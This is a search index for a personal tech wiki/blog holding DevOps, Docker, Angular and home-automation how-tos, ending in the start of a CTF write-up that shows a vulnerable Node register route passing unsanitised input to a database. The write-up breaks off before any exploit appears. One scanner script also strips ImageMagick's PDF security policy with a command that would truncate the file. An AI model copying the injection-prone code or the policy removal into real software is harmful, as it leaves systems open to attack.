{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"index.html","title":"Home","text":"<p>Hi! This is my personal Wiki/Blog.</p> <p>It contains all the stuff I want to remember and share with others.</p>"},{"location":"tags.html","title":"Tags","text":"<p>All Blog and articles according to their tags:</p>"},{"location":"tags.html#tag:android","title":"android","text":"<ul> <li>            How to sign Android App Bundles in Azure Pipelines          </li> </ul>"},{"location":"tags.html#tag:angular","title":"angular","text":"<ul> <li>            Set runtime variables for an Angular app in a Docker Container          </li> </ul>"},{"location":"tags.html#tag:awtrix","title":"awtrix","text":"<ul> <li>            Awtrix UI          </li> </ul>"},{"location":"tags.html#tag:azure-pipelines","title":"azure-pipelines","text":"<ul> <li>            How to sign Android App Bundles in Azure Pipelines          </li> </ul>"},{"location":"tags.html#tag:build","title":"build","text":"<ul> <li>            How to push to TFS/VSTS Repo with the Build Agent Identity          </li> </ul>"},{"location":"tags.html#tag:ctf","title":"ctf","text":"<ul> <li>            Report of the BambiCTF of ENOFLAG          </li> </ul>"},{"location":"tags.html#tag:docker","title":"docker","text":"<ul> <li>            Generate PDF Documentation from mkdocs          </li> <li>            How to configure Docker to use certain network ranges          </li> <li>            Set runtime variables for an Angular app in a Docker Container          </li> </ul>"},{"location":"tags.html#tag:dotnet","title":"dotnet","text":"<ul> <li>            LINQ Query Extensions          </li> <li>            Serilog Middleware          </li> </ul>"},{"location":"tags.html#tag:hacking","title":"hacking","text":"<ul> <li>            Report of the BambiCTF of ENOFLAG          </li> </ul>"},{"location":"tags.html#tag:hassio","title":"hassio","text":"<ul> <li>            Use Windows Task Scheduler to Track when you are on the PC          </li> <li>            Use Windows Task Scheduler to Track when you are on the PC          </li> </ul>"},{"location":"tags.html#tag:incomplete","title":"incomplete","text":"<ul> <li>            Reverse Engineering the Livisi Smart Home          </li> <li>            Reverse Engineering the Livy Ring          </li> <li>            TU Berlin Security Lab          </li> </ul>"},{"location":"tags.html#tag:kubernetes","title":"kubernetes","text":"<ul> <li>            Configure Kubernetes Ingress with Traefik          </li> </ul>"},{"location":"tags.html#tag:linq","title":"linq","text":"<ul> <li>            LINQ Query Extensions          </li> </ul>"},{"location":"tags.html#tag:linux","title":"linux","text":"<ul> <li>            Reverse Engineering the Livisi Smart Home          </li> <li>            Reverse Engineering the Livy Ring          </li> <li>            TU Berlin Security Lab          </li> </ul>"},{"location":"tags.html#tag:livisi","title":"livisi","text":"<ul> <li>            Reverse Engineering the Livisi Smart Home          </li> </ul>"},{"location":"tags.html#tag:livy","title":"livy","text":"<ul> <li>            Reverse Engineering the Livy Ring          </li> <li>            TU Berlin Security Lab          </li> </ul>"},{"location":"tags.html#tag:localdb","title":"localdb","text":"<ul> <li>            Fix various localdb errors          </li> </ul>"},{"location":"tags.html#tag:magicmirror","title":"magicmirror","text":"<ul> <li>            Display your Solar installation number on MagicMirror          </li> </ul>"},{"location":"tags.html#tag:middleware","title":"middleware","text":"<ul> <li>            Serilog Middleware          </li> </ul>"},{"location":"tags.html#tag:mkdocs","title":"mkdocs","text":"<ul> <li>            Generate PDF Documentation from mkdocs          </li> </ul>"},{"location":"tags.html#tag:nginx","title":"nginx","text":"<ul> <li>            Set runtime variables for an Angular app in a Docker Container          </li> </ul>"},{"location":"tags.html#tag:pdf","title":"pdf","text":"<ul> <li>            Generate PDF Documentation from mkdocs          </li> </ul>"},{"location":"tags.html#tag:reverse-engineering","title":"reverse-engineering","text":"<ul> <li>            Reverse Engineering the Livisi Smart Home          </li> <li>            Reverse Engineering the Livy Ring          </li> <li>            TU Berlin Security Lab          </li> </ul>"},{"location":"tags.html#tag:semantic-release","title":"semantic-release","text":"<ul> <li>            How to push to TFS/VSTS Repo with the Build Agent Identity          </li> </ul>"},{"location":"tags.html#tag:serilog","title":"serilog","text":"<ul> <li>            Serilog Middleware          </li> </ul>"},{"location":"tags.html#tag:smarthome","title":"smarthome","text":"<ul> <li>            Awtrix UI          </li> </ul>"},{"location":"tags.html#tag:sql","title":"sql","text":"<ul> <li>            Fix various localdb errors          </li> </ul>"},{"location":"tags.html#tag:sqlserver","title":"sqlserver","text":"<ul> <li>            Fix various localdb errors          </li> </ul>"},{"location":"tags.html#tag:traefik","title":"traefik","text":"<ul> <li>            Configure Kubernetes Ingress with Traefik          </li> </ul>"},{"location":"tags.html#tag:tu-berlin","title":"tu-berlin","text":"<ul> <li>            Report of the BambiCTF of ENOFLAG          </li> </ul>"},{"location":"tags.html#tag:ui","title":"ui","text":"<ul> <li>            Awtrix UI          </li> </ul>"},{"location":"tags.html#tag:windows","title":"windows","text":"<ul> <li>            Fix various localdb errors          </li> <li>            Use Windows Task Scheduler to Track when you are on the PC          </li> <li>            Use Windows Task Scheduler to Track when you are on the PC          </li> </ul>"},{"location":"automations/generate_pdf_from_mkdocs.html","title":"Generate PDF Documentation from mkdocs","text":"<p>https://pypi.org/project/mkdocs-with-pdf/</p> <p>Better than:  https://github.com/comwes/mkpdfs-mkdocs-plugin</p> <pre><code>FROM squidfunk/mkdocs-material\n\n# Install everything that is needed for mkdocs-with-pdf\nARG weasyprint_version=52.5\nRUN apk add -u cairo cairo-gobject pango gdk-pixbuf py3-brotli py3-lxml py3-cffi py3-pillow msttcorefonts-installer fontconfig zopfli py3-pip py3-pillow py3-cffi py3-brotli gcc musl-dev python3-dev pango py3-pip gcc musl-dev python3-dev pango zlib-dev jpeg-dev openjpeg-dev g++ libffi-dev \\\n    &amp;&amp; update-ms-fonts &amp;&amp; fc-cache -f\nRUN pip install weasyprint==$weasyprint_version mkdocs-with-pdf\n</code></pre> <p>Add custom CSS (https://github.com/orzih/mkdocs-with-pdf/issues/119) <pre><code>:root &gt; * {\n    --md-primary-fg-color: #e20074;\n    --md-primary-fg-color--light: #ecb7b7;\n    --md-primary-fg-color--dark: #9e0051;\n}\n\n#doc-toc * {\n    border-color: var(--md-primary-fg-color) !important;\n}\n\narticle h1,\narticle h2,\narticle h3 {\n    border-color: var(--md-primary-fg-color) !important;\n}\n</code></pre></p> <p>Build the documentation by running the following commands:</p> <pre><code># Development (serving the documentation)\ndocker-compose up\n\n# Build the docs to ./site\ndocker-compose run --rm mkdocs build\n</code></pre> <p>Referenz f\u00fcr Formatierung: https://squidfunk.github.io/mkdocs-material/reference/</p> <pre><code>site_name: My Docs\ntheme:\n  name: material\n  logo: assets/logo.png\nsite_author: Me\nextra_css:\n  - custom.css\nplugins:\n  # Using https://github.com/orzih/mkdocs-with-pdf\n    - with-pdf:\n        author: ''\n        cover_title: Tool\n        cover_subtitle: Dokumentation f\u00fcr \n        cover_logo: docs/assets/logo_claim.png\n        # debug_html: true\nmarkdown_extensions:\n  - admonition\n  - pymdownx.details\n  - pymdownx.superfences\n  - attr_list\n  - md_in_html\n\ncopyright: '\u00a9 2024 DanielHabenicht'\n</code></pre> <pre><code>version: \"3.9\" \nservices:\n  mkdocs:\n    build: .\n    ports:\n      - \"8000:8000\"\n    volumes:\n      - .:/docs\n</code></pre>","tags":["docker","mkdocs","pdf"]},{"location":"automations/outlook_google_calendar_sync.html","title":"Sync Work and Private Calendars","text":"<p>The OutlookGoogleCalendarSync App lets you synchronize calendars while still retaining private data (be it work data at work or private events in your own calendar).</p>"},{"location":"automations/outlook_google_calendar_sync.html#windows-setup","title":"Windows Setup","text":"<ol> <li>Download the app and place it in a Folder <code>OutlookGoogleCalendarSync</code> on your Desktop.</li> <li>Start the application and make any changes necessary to your configuration and save it.</li> <li>Create a <code>.bat</code> file in  <code>C:\\Users\\&lt;Username&gt;\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>:  If you need to sync multiple calendars create multiple configurations and start them via:  <code>\"C:\\Users\\&lt;Username&gt;\\Desktop\\OutlookGoogleCalendarSync\\OutlookGoogleCalendarSync.exe\" /s:\"C:\\Users\\&lt;Username&gt;\\Desktop\\OutlookGoogleCalendarSync\\personal\\settings.xml\" /l:\"C:\\Users\\&lt;Username&gt;\\Desktop\\OutlookGoogleCalendarSync\\personal\\calendar.log\" /t:\"Personal Calendar Sync\" /d:60</code></li> </ol>"},{"location":"automations/raspberry_scan_automation.html","title":"Raspberry scan automation","text":"<p>Needed:</p> <ul> <li>Pi Zero</li> <li>Scanner (e.g. Canon Lide 210)</li> </ul> <p>Flash headless with Raspberry Imager.</p> <pre><code>sudo apt update\nsudo apt upgrade\n\nsudo apt install sane scanbd imagemagick\n\n\n# As per https://wiki.ubuntuusers.de/scanbd/\necho \"net\" &gt; /etc/sane.d/dll.conf\n# Only works because I use a canon scanner! TODO: just remove \"net\"\necho \"canon_lide70\" &gt; /etc/scanbd/dll.conf\n\n# Find scanner\nsane-find-scanner\n\n\necho \"\n# saned lokal, langer timeout unnoetig\nconnect_timeout = 3\n# scanbm lauscht an localhost\nlocalhost\" &gt;&gt; /etc/sane.d/net.conf\n\nsudo systemctl stop inetd.service\nsudo systemctl disable inetd.service\n\nsudo systemctl stop saned.socket\nsudo systemctl disable saned.socket\n\nsudo systemctl enable scanbd.service # zur automatischen Ausf\u00fchrung beim Systemstart n\u00f6tig\nsudo systemctl start scanbd.service\nsudo systemctl enable scanbm.socket # zur automatischen Ausf\u00fchrung beim Systemstart n\u00f6tig\nsudo systemctl start scanbm.socket\n\nmkdir /etc/scanbd/scripts\n\ncat &lt;&lt;EOT &gt;&gt; /etc/scanbd/scripts/scan.sh\n#!/bin/sh\nTMPDIR=\"/home/pi\"  #\"$HOME\"\nDATE=$(date '+%Y_%m_%d_%H_%M_%S')\nTMPFILE=\"$TMPDIR/scan_$DATE\"\n\necho \"Scanning to $TMPFILE\"\n\nscanimage --resolution 300 --mode Color --format jpeg -l 0mm -t 0mm -x 210mm -y 297mm &gt; \"$TMPFILE.jpg\"\n\n# Retry\nif [ -s \"$TMPFILE.jpg\" ]\nthen\n    echo \"worked the first time\"\nelse\n    echo \"retrying scanning\"\n    rm \"$TMPFILE.jpg\"\n    scanimage --resolution 300 --mode Color --format jpeg -l 0mm -t 0mm -x 210mm -y 297mm &gt; \"$TMPFILE.jpg\"\nfi\n\n\n\nif [ -s \"$TMPFILE.jpg\" ]\nthen\n    # pdf-web-edit\n    echo \"Uploading to pdf-web-edit\"\n    curl --retry 5 --retry-delay 10 -i -k -F \"file=@$TMPFILE.jpg\" http://192.168.178.169:8080/api/documents/upload\n\n    # ngx-paperless\n    #curl -F \"document=@$TMPFILE.jpg\" -u \"import:&lt;password&gt;\" http://192.168.178.169:8000/api/documents/post_document/\nelse\n    echo \"File scanning did not work?!\"\nfi\n\n#rm \"$TMPFILE.jpg\"\n\n#convert \"$TMPFILE.jpg\" \"$TMPFILE.pdf\"\n\nEOT\nchmod +x /etc/scanbd/scripts/scan.sh\n\n\nsed -i 's/user    = saned/user    = pi/' /etc/scanbd/scanbd.conf\nsed -i 's/test.script/scan.sh/' /etc/scanbd/scanbd.conf\n\n# Fix imagemagick (convert) security policy\nsed '/PDF/d' policy.xml &gt; policy.xml\n\n\n\n\n\n# Power Saving\nsed -i '11s/^/\\/usr\\/bin\\/tvservice -o/' /etc/rc.local # Add line at 1th line\n</code></pre> <pre><code>ls | xargs  -I % curl -i -o - -k -F \"file=@%\" https://localhost:7114/api/documents/upload\n</code></pre>"},{"location":"automations/track-time-windows-task-scheduler.html","title":"Use Windows Task Scheduler to Track when you are on the PC","text":"<p>You need 4 Task Scheduler Events:  - On Workstation lock of any user - On workstation unlock of  - On event - Log: System, Source: Winlogon, Event ID: 7002 - At log on of  <p>And then run this script Script:</p> <pre><code>@echo off\n@REM Just comment in if you can't verify on your home assistant instance\n@REM set cdate=%date:~-4%-%date:~7,2%-%date:~4,2%\n@REM set ctime=%time:~0,2%:%time:~3,2%:%time:~6,2%\n@REM if \"%1\"==\"login\" echo %cdate%: %username% - Logged in at %ctime% &gt;&gt; C:\\tracking\\userlog.txt\n@REM if \"%1\"==\"logout\" echo %cdate%: %username% - Logged out at %ctime% &gt;&gt; C:\\tracking\\userlog.txt\n@REM if \"%1\"==\"locked\" echo %cdate%: %username% - Locked at %ctime% &gt;&gt; C:\\tracking\\userlog.txt\n@REM if \"%1\"==\"unlocked\" echo %cdate%: %username% - Unlocked at %ctime% &gt;&gt; C:\\tracking\\userlog.txt\n\nif \"%1\"==\"login\" curl -i -X POST -H \"Content-Type:application/json\" -H \"Authorization:Bearer YOUR_TOKEN\" -d \"{\\\"state\\\": \\\"True\\\" }\" \"https://hass.example.de/api/states/sensor.pc_login\"\n\nif \"%1\"==\"logout\" curl curl -i -X POST -H \"Content-Type:application/json\" -H \"Authorization:Bearer YOUR_TOKEN\" -d \"{\\\"state\\\": \\\"False\\\" }\" \"https://hass.example.de/api/states/sensor.pc_login\"\n\nif \"%1\"==\"locked\" curl curl -i -X POST -H \"Content-Type:application/json\" -H \"Authorization:Bearer YOUR_TOKEN\" -d \"{\\\"state\\\": \\\"False\\\" }\" \"https://hass.example.de/api/states/sensor.pc_login\"\n\nif \"%1\"==\"unlocked\" curl curl -i -X POST -H \"Content-Type:application/json\" -H \"Authorization:Bearer YOUR_TOKEN\" -d \"{\\\"state\\\": \\\"True\\\" }\" \"https://hass.example.de/api/states/sensor.pc_login\"\n</code></pre> <p>If you want to monitor even more values have a look at: https://iotlink.gitlab.io/</p> <p>This is a modified version from https://sumtips.com/how-to/windows-track-user-lock-unlock-login-logout-time/</p> <p>Integrate with any Time Tracking software: https://github.com/DanielHabenicht/TimeTracking</p>","tags":["windows","hassio"]},{"location":"blog/index.html","title":"Blog","text":"<p>This is a Blog - at the beginning of its lifespan.</p>"},{"location":"blog/2018/10/31/configure-docker-for-certain-network-ranges.html","title":"How to configure Docker to use certain network ranges","text":"<p>In order to configure Docker to use a certain network range just paste this into your <code>/etc/docker/daemon.json</code>.</p> <pre><code>{\n  \"default-address-pools\": [{ \"base\": \"192.168.199.0/24\", \"size\": 28 }]\n}\n</code></pre> <p>It configures Docker to use the address space from <code>192.168.199.0</code> to <code>192.168.199.255</code> in blocks of 16 addresses each. This means the <code>docker0</code> network gets created like this:</p> <pre><code># ip a\n64: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default\n    link/ether 02:42:2c:a9:5e:96 brd ff:ff:ff:ff:ff:ff\n    inet 192.168.199.1/28 brd 192.168.199.15 scope global docker0\n       valid_lft forever preferred_lft forever\n</code></pre> <p>and all other bridge networks in the same way:</p> <pre><code># ip a\n65: br-fc09df0ee651: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default\n    link/ether 02:42:3d:0c:57:b3 brd ff:ff:ff:ff:ff:ff\n    inet 192.168.199.17/28 brd 192.168.199.31 scope global br-fc09df0ee651\n       valid_lft forever preferred_lft forever\n</code></pre> <p>Here you have the CIDR notation for reference.</p>","tags":["docker"]},{"location":"blog/2019/02/06/angular-nginx-runtime-variables.html","title":"Set runtime variables for an Angular app in a Docker Container","text":"<p>A guide for setting up runtime variables for an Angular App which is hosted in a Nginx Docker container (or any else). What's special about this? It does not need another file to be loaded before bootstrapping the app, neither to be included via the docker run command. It simply lets you set variables in your angular app via Environment variables passed to docker by <code>docker run --rm -e \"TEST_ENV=This really works!\" -it &lt;image_name&gt;</code>.</p> <p>At the moment this is only tested with debian based docker images like <code>nginx</code>, <code>alpine</code> images do not work currently!</p> <p>Other guides always want you to load a special file at the app startup.<sup>1</sup> <sup>2</sup> This does not only defer the startup time by one web request but also makes it harder to just fire up a docker container, as you will have to include the file somehow, by building your own image or mounting it at startup.</p> <p>Try it out right now by running: <code>docker run --rm -p 8080:80 -e \"TEST_ENV=This really works!\" -it danielhabenicht/docker-angular-runtime-variables</code>. Change the variable to your liking and navigate to https://localhost:8080.</p>","tags":["docker","nginx","angular"]},{"location":"blog/2019/02/06/angular-nginx-runtime-variables.html#how-does-it-work","title":"How does it work?","text":"<p>Basically this solution uses a script that substitutes the variables in some or all files (you can choose) with those given by the environment at container startup and then run the commands given to it.</p>","tags":["docker","nginx","angular"]},{"location":"blog/2019/02/06/angular-nginx-runtime-variables.html#1-create-the-script","title":"1. Create the script","text":"<p>Those two scripts do just that. There are two variations as it depends on your needs to manipulate one or multiple files. A combination of both may also work for use cases where some variables are mandatory and other aren't. Go ahead and copy one of them to your project for now!</p>","tags":["docker","nginx","angular"]},{"location":"blog/2019/02/06/angular-nginx-runtime-variables.html#a-for-one-file-only","title":"a) For one file only","text":"<p>This script utilizes the <code>envsubst</code> command to replace the variables given. Throws no error if the variable is undefined.</p> substitute_env_variables.sh<pre><code>#!/bin/bash\n\n# The first parameter is the path to the file which should be substituted\nif [[ -z $1 ]]; then\n    echo 'ERROR: No target file given.'\n    exit 1\nfi\n\n# The included envsubst command (not available in every docker container) will substitute the variables for us.\n# They should have the format ${TEST_ENV} or $TEST_ENV\n# For more information look up the command here: https://www.gnu.org/software/gettext/manual/html_node/envsubst-Invocation.html\nenvsubst '\\$TEST_ENV \\$OTHER_ENV' &lt; \"$1\" &gt; \"$1\".tmp &amp;&amp; mv \"$1\".tmp \"$1\"\n\n# Set DEBUG=true in order to log the replaced file\nif [ \"$DEBUG\" = true ] ; then\n  exec cat $1\nfi\n\n# Execute all other commands with paramters\nexec \"${@:2}\"\n</code></pre>","tags":["docker","nginx","angular"]},{"location":"blog/2019/02/06/angular-nginx-runtime-variables.html#b-for-multiple-files","title":"b) For multiple files","text":"<p>Uses some custom <code>grep</code>/<code>sed</code> logic to replace the variables given. Throws an error if a variable is undefined.</p> substitute_env_variables_multi.sh<pre><code>#!/bin/bash\n\n# State all variables which should be included here\nvariables=( TEST_ENV )\n\n# The first parameter has to be the path to the directory or file which should be used for the substitution\nif [[ -z $1 ]]; then\n    echo 'ERROR: No target file or directory given.'\n    exit 1\nfi\n\nfor i in \"${variables[@]}\"\ndo\n  # Error if variable is not defined\n  if [[ -z ${!i} ]]; then\n    echo 'ERROR: Variable \"'$i'\" not defined.'\n    exit 1\n  fi\n\n  # Escape special characters, for URLs\n  replaceString=$(echo ${!i} | sed -e 's/[\\/&amp;]/\\\\&amp;/g')\n\n  # Get all files including the environment variable (and ending with '.html') substitute the placeholder with its content\n  if [ \"$DEBUG\" = true ]\n  then\n    # If DEBUG=true in order to log the replaced files\n    grep -rl --include \\*.html \"$i\" \"$1\" | xargs sed -i \"s/\\${\"\"$i\"\"}/$replaceString/Ig;w /dev/stdout\"\n  else\n    # If DEBUG=false do it without logging\n    grep -rl --include \\*.html \"$i\" \"$1\" | xargs sed -i \"s/\\${\"\"$i\"\"}/$replaceString/Ig\"\n  fi\ndone\n\n# Execute all other parameters\nexec \"${@:2}\"\n</code></pre>","tags":["docker","nginx","angular"]},{"location":"blog/2019/02/06/angular-nginx-runtime-variables.html#2-prepare-your-angular-app","title":"2. Prepare your angular app","text":"<p>This is kind of hacky but also the most straight forward way:</p> <ol> <li>Add the <code>&lt;script&gt;</code> Tag to your <code>index.html</code> as shown below.</li> </ol> index.html<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n  &lt;head&gt;\n    &lt;meta charset=\"utf-8\" /&gt;\n    &lt;title&gt;Docker - Angular Runtime Variables Demo&lt;/title&gt;\n    &lt;base href=\"/\" /&gt;\n    &lt;script&gt;\n      var ENV = {\n        test: \"${TEST_ENV}\"\n      };\n    &lt;/script&gt;\n\n    &lt;link href=\"https://fonts.googleapis.com/css?family=Major+Mono+Display\" rel=\"stylesheet\" /&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" /&gt;\n    &lt;link rel=\"icon\" type=\"image/x-icon\" href=\"favicon.ico\" /&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;app-root&gt;&lt;/app-root&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <ol> <li>Create a <code>runtimeEnvironment.ts</code> file in your <code>src/environments</code> folder and paste the content.</li> </ol> runtimeEnvironment.ts<pre><code>declare var ENV;\n\nexport const runtimeEnvironment = {\n  test: ENV.test === '${TEST_ENV}' ? false : ENV.test\n};\n</code></pre> <p>Info</p> <p>We do not use the <code>environment.ts</code> file as this does induce some errors with advanced angular apps (especially if use in <code>.forRoot()</code> functions), for example:</p> <pre><code>Error during template compile of 'environment.ts'\nReference to a local (non-export) symbols are not supported in decorators but 'ENV' was referenced\n</code></pre>","tags":["docker","nginx","angular"]},{"location":"blog/2019/02/06/angular-nginx-runtime-variables.html#3-stitch-everything-together-in-docker","title":"3. Stitch everything together in Docker","text":"<p>While building your docker image you have to copy the script you choose earlier and set the executable rights. Then define it as your entry point and do not forget to specify the path of the file you want to update with the environment variables.</p> <p>Warning</p> <p>The Bash script should have <code>LF</code> line endings, otherwise Docker will fail with <code>exec user process caused \"no such file or directory\"</code> If you you are not sure if you have LF ending in your git repository, check out this guide: https://stackoverflow.com/a/33424884/9277073</p> Dockerfile<pre><code>#################\n# Builder Image #\n#################\n# Just building the Angular application here, nothing special about it\nFROM node:11.2 as builder\n\nWORKDIR /usr/src/app\nCOPY ./package.json ./package.json\nCOPY ./package-lock.json ./package-lock.json\nRUN npm ci --silent\nCOPY . .\nRUN npm run build\n\n\n\n####################\n# Production Image #\n####################\nFROM nginx\n\n# You can make clear that this image lets the user define some environment variables by stating them:\nARG TEST\n\n# You can also define some standard values to you environment variables\nENV TEST=\"Hello variable\"\n\n# Copy the dist files from the builder image into this image\nCOPY --from=builder /usr/src/app/dist/docker-angular-runtime-variables /usr/share/nginx/html\n\n# It is very important to set the WORKDIR to the directory of the file to be exectued after the ENTRYPOINT script or reference it absolutely\nWORKDIR /etc/nginx\n\n# Copy our ENTRYPOINT script into the docker container\nCOPY ./substitute_env_variables_multi.sh ./entrypoint.sh\n# and mark it as executable\nRUN chmod +x ./entrypoint.sh\n\n# Define it as the entrypoint script together with the path or directory that should be searched and substituted with the environment variables\nENTRYPOINT [\"./entrypoint.sh\", \"/usr/share/nginx/html/index.html\"]\n# Define the command that should be executed at the container startup\nCMD [\"nginx\", \"-g\", \"daemon off;\"]\n</code></pre>","tags":["docker","nginx","angular"]},{"location":"blog/2019/02/06/angular-nginx-runtime-variables.html#4-use-the-variables-in-you-app","title":"4. Use the Variables in you app","text":"<p>Include the <code>runtimeEnvironment</code> in your angular components, services, pipes etc.. For example:</p> src/app/app.component.ts<pre><code>import { Component, OnInit } from '@angular/core';\nimport { runtimeEnvironment } from 'src/environments/runtimeEnvironment';\n\n@Component({\n  selector: 'app-root',\n  templateUrl: './app.component.html',\n  styleUrls: ['./app.component.scss']\n})\nexport class AppComponent implements OnInit {\n  title = 'docker-angular-runtime-variables';\n\n  constructor() {}\n\n  ngOnInit() {\n    this.title = runtimeEnvironment.test;\n  }\n}\n</code></pre> src/app/app.component.html<pre><code>&lt;div id=\"content\"&gt;\n  &lt;div class=\"wrapper\"&gt;&lt;/div&gt;\n  &lt;div class=\"wrapper\"&gt;\n    &lt;h1 id=\"message\"&gt;Your environment says: {{ title }}!&lt;/h1&gt;\n    &lt;a\n      id=\"link\"\n      target=\"_blank\"\n      rel=\"noopener\"\n      href=\"https://danielhabenicht.github.io/docker/angular/2019/02/06/angular-nginx-runtime-variables.html\"\n      &gt;Link to the blog article&lt;/a\n    &gt;\n  &lt;/div&gt;\n  &lt;div class=\"wrapper\"&gt;&lt;/div&gt;\n&lt;/div&gt;\n</code></pre> <p>Thanks for reading. Hope you enjoyed it. ;)</p>","tags":["docker","nginx","angular"]},{"location":"blog/2019/02/06/angular-nginx-runtime-variables.html#appendix-unit-tests-with-karma","title":"Appendix - Unit Tests with karma","text":"<p>From https://stackoverflow.com/a/19263750/9277073</p> <p>If you are using the environment variables during your tests you have to mock them by configuring a globals.js and adding it to your test files:</p> <ol> <li>Create a globals.js with your <code>ENV</code> variable.</li> </ol> src/globals.js<pre><code>var ENV = {\n  test: \"Karma test value\"\n};\n</code></pre> <ol> <li>Link the <code>globals.js</code> in your karma.config.js, by specifying <code>files: [\"globals.js]</code></li> </ol> src/karma.conf.js<pre><code>// Karma configuration file, see link for more information\n// https://karma-runner.github.io/1.0/config/configuration-file.html\n\nmodule.exports = function(config) {\n  config.set({\n    files: [\"globals.js\"],\n    basePath: \"\",\n    frameworks: [\"jasmine\", \"@angular-devkit/build-angular\"],\n    plugins: [\n      require(\"karma-jasmine\"),\n      require(\"karma-chrome-launcher\"),\n      require(\"karma-jasmine-html-reporter\"),\n      require(\"karma-coverage-istanbul-reporter\"),\n      require(\"@angular-devkit/build-angular/plugins/karma\")\n    ],\n    client: {\n      clearContext: false // leave Jasmine Spec Runner output visible in browser\n    },\n    coverageIstanbulReporter: {\n      dir: require(\"path\").join(__dirname, \"../coverage/docker-angular-runtime-variables\"),\n      reports: [\"html\", \"lcovonly\", \"text-summary\"],\n      fixWebpackSourcePaths: true\n    },\n    reporters: [\"progress\", \"kjhtml\"],\n    port: 9876,\n    colors: true,\n    logLevel: config.LOG_INFO,\n    autoWatch: true,\n    browsers: [\"Chrome\"],\n    singleRun: false\n  });\n};\n</code></pre> <ol> <li> <p>https://juristr.com/blog/2018/01/ng-app-runtime-config/\u00a0\u21a9</p> </li> <li> <p>https://www.technouz.com/4746/how-to-use-run-time-environment-variables-in-angular/\u00a0\u21a9</p> </li> </ol>","tags":["docker","nginx","angular"]},{"location":"blog/2020/01/23/sign-android-app-bundles-azure-pipelines.html","title":"How to sign Android App Bundles in Azure Pipelines","text":"<p>The Standard Azure Pipelines Android signing task signs only <code>*.apk</code> files. But that`s not what google wants you to upload. </p> <p>But there is a simple workaround based on this Stackoverflow:</p> <p><pre><code>- task: AndroidSigning@2\n  inputs:\n    apkFiles: '**/*.aab'\n    jarsign: true\n    jarsignerKeystoreFile: 'yourkeystore.jks'\n    jarsignerKeystorePassword: '$(yourSecretKeystorePassword)'\n    jarsignerKeystoreAlias: 'yourkeystore.alias'\n    jarsignerKeyPassword: '$(yourSecretKeyPassword)'\n    # The two Arguments working there magic:\n    jarsignerArguments: '-sigalg SHA256withRSA -digestalg SHA-256'\n    zipalign: true\n</code></pre> Simply add the right signing algorithm as options.</p> <p>You are wondering why it does not accept your Keystore file? It has to be a secure file (just upload it to <code>Pipelines &gt; Library &gt; Secure Files</code> and reference its name).</p>","tags":["android","azure-pipelines"]},{"location":"blog/2021/01/03/magic-mirror-solar-kiwigrid.html","title":"Display your Solar installation number on MagicMirror","text":"<p>Display your local solar system numbers (SolarWatt/KiwiGrid), like power drawn from the mains or your solar array, on your magicmirror. </p> <p>This guide assumes that you already installed your MagicMirror, if not set it up with this guide.</p> <p>The finished Interface will look something like this, but lets get started!</p> <p>First query your local network for your KiwiGrid Instance, you can probe it via a link like <code>http://192.***.***.***/rest/kiwigrid/wizard/devices</code>. It should answer with all properties it has. (You can also reach it via the SolarWatt WebPortal, follow this guide)</p> <p>Second install the module <code>MMM-json</code>.</p> <pre><code>#  Clone the repository into MagicMirror/modules directory and install the dependencies\ncd ./modules\ngit clone https://github.com/DanielHabenicht/MMM-json.git\nnpm install\n</code></pre> <p>Copy and edit the config for the module, to display the values you like.  You can find some documentation of the response here <pre><code>{\n    module: 'MMM-json',\n    position: 'bottom_left',\n    config: {\n        url: \"https://jsonplaceholder.typicode.com/users\",\n        header: \"Solar\",\n        headerIcon: \"fa-sun\",\n        values: [\n            {\n                title: \"Ladezustand\",\n                query:  \"$..items[?(@.guid=='urn:solarwatt:myreserve:bc:a42c134g32769')].tagValues.StateOfCharge.value\",\n                suffix: \"%\"\n            },\n            {\n                title: \"Aus dem Netz\",\n                query: \"$..items[?(@.guid=='3217ae6c-06b5-45ee-9879-9c5cf5117372')].tagValues.PowerConsumedFromGrid.value\",\n                suffix: \"kWh\",\n                numberDevisor: 1000\n            },\n            {\n                    title: \"Solarstrom\",\n                    query: \"$..items[?(@.guid=='f2a0f25d-4b23-4097-a6dd-f77b2eaf91ee')].tagValues.PowerProduced.value\",\n                    suffix: \"kWh\",\n                    numberDevisor: 1000\n            }\n        ]\n    }\n },\n</code></pre></p> <p>More interesing Links:  https://forum.iobroker.net/topic/14065/adapter-energymanager-eon-aura-bzw-solarwatt/46</p>","tags":["magicmirror"]},{"location":"blog/2021/04/17/first-ctf-at-tu-berlin-bambi.html","title":"Report of the BambiCTF of ENOFLAG","text":"<p>This was my first CTF and I will try to explain a vulnerability I fixed and exploited. </p>","tags":["ctf","hacking","tu-berlin"]},{"location":"blog/2021/04/17/first-ctf-at-tu-berlin-bambi.html#setup","title":"Setup","text":"<p>During the CTF I connected to the server with VSCode, which meant I had instant access to all files and could edit them without changing between multiple ssh windows with <code>nano</code> editors.</p> <p>Also the extensions: </p> <ul> <li>Docker:    For always having an eye on your services, easy access to logs and one-click terminals to your containers. </li> <li>REST Client:    For writing simple HTTP Requests in a file format. (see below)</li> <li>Python    For writing the exploit in a simple jupyter notebook. </li> </ul> <p>allowed for a hassle free search for vulnerabilities.</p>","tags":["ctf","hacking","tu-berlin"]},{"location":"blog/2021/04/17/first-ctf-at-tu-berlin-bambi.html#stonksexchange-vulnerability","title":"Stonksexchange Vulnerability","text":"<p>Here you can find the vulnerable service to try for yourself.. </p> <p>The service is a simple node application which allows exchange of messages for registered/loggedin users: </p> <p></p> <p>First I tried a simple XSS attack but was unsuccessful. Then it came to my mind that it might be some kind of injection attack as the service had a database. After having a look at the files I noticed that user input was passed to the database without sanitizing it:  <pre><code>// /routes/index.js\nrouter.post('/register', function (req, res, next) {\n  if (!req.body.username || !req.body.password) {\n    res.status(400).send('Missing username or password');\n    return;\n  }\n  var db = req.app.locals.db;\n  /*\n   * Notice the findOne() function below which \n   * gets the data directly from the request body\n   */\n  